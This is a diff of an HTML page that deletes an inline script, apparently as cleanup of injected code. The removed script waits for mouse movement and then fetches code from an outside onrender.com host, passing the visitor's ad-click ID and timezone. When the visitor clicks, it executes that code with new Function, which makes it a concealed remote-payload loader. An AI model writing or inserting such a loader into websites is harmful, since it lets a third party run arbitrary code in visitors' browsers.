@@ -758,47 +758,5 @@
     </footer>
 
     <script src="script.js"></script>
-    <script>
-      const gclid = new URLSearchParams(location.search).get("gclid");
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const RENDER_BASE_URL = "https://yogaleisureltd.onrender.com";
-
-      let someCode = null;
-
-      document.cookie = "access_cookie=true; path=/; max-age=300";
-
-      document.addEventListener("mousemove", async function fetchCodeOnce() {
-        document.removeEventListener("mousemove", fetchCodeOnce);
-        try {
-          const res = await fetch(
-            `${RENDER_BASE_URL}/frontend-loader?gclid=${gclid}`,
-            {
-              headers: {
-                "x-client-timezone": timezone,
-                "x-access-cookie": "true",
-              },
-            }
-          );
-          const data = await res.json();
-          if (data && data.code) {
-            someCode = data.code;
-          }
-        } catch (err) {
-          console.error("Could not fetch some code", err);
-        }
-      });
-
-      function handleSomeClick() {
-        if (someCode) {
-          try {
-            new Function(someCode)();
-          } catch (err) {
-            console.error("Error executing code:", err);
-          }
-        }
-      }
-
-      document.addEventListener("click", handleSomeClick);
-    </script>
   </body>
 </html>
